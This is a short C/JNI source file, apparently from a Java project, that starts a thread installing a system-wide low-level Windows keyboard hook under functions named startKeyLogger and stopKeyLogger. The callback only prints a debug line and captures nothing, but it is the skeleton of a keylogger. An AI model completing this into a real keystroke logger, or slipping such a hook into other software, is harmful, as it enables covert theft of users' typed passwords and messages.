#include <Windows.h>
#include <khopanjni.h>
#include "keylogger.h"

JavaVM* globalVirtualMachine;
HANDLE globalThread;
JNIEnv* globalEnvironment;

DWORD WINAPI KeyLoggerThread(_In_ LPVOID);
LRESULT CALLBACK KeyLoggerProcedure(_In_ int, _In_ WPARAM, _In_ LPARAM);

void startKeyLogger(JNIEnv* environment, JavaVM* virtualMachine) {
	globalVirtualMachine = virtualMachine;
	globalThread = CreateThread(NULL, 0, KeyLoggerThread, NULL, 0, NULL);

	if(!globalThread) {
		KHWin32Error(environment, GetLastError(), "CreateThread");
	}
}

void stopKeyLogger(JNIEnv* environment) {
	if(globalThread) {
		if(!CloseHandle(globalThread)) {
			KHWin32Error(environment, GetLastError(), "CloseHandle");
		}
	}
}

DWORD WINAPI KeyLoggerThread(_In_ LPVOID parameter) {
	JNIEnv* environment;
	JavaVMAttachArgs arguments;
	arguments.version = JNI_VERSION_21;
	arguments.name = NULL;
	arguments.group = NULL;
	jint status = (*globalVirtualMachine)->AttachCurrentThread(globalVirtualMachine, (void**) &environment, &arguments);
	
	if(status != JNI_OK) {
		return 1;
	}
	
	globalEnvironment = environment;
	HHOOK hook = SetWindowsHookExW(WH_KEYBOARD_LL, KeyLoggerProcedure, NULL, 0);
	
	if(!hook) {
		KHWin32Error(environment, GetLastError(), "SetWindowsHookExW");
		return 2;
	}
	
	MSG message = {0};

	while(GetMessageW(&message, NULL, 0, 0)) {
		TranslateMessage(&message);
		DispatchMessageW(&message);
	}

	if(!UnhookWindowsHookEx(hook)) {
		KHWin32Error(environment, GetLastError(), "UnhookWindowsHookEx");
		return 3;
	}

	status = (*globalVirtualMachine)->DetachCurrentThread(globalVirtualMachine);

	if(status != JNI_OK) {
		return 4;
	}

	return 0;
}

LRESULT CALLBACK KeyLoggerProcedure(_In_ int code, _In_ WPARAM wparam, _In_ LPARAM lparam) {
	KHStandardOutput(globalEnvironment, "Hook callback");
	return CallNextHookEx(NULL, code, wparam, lparam);
}
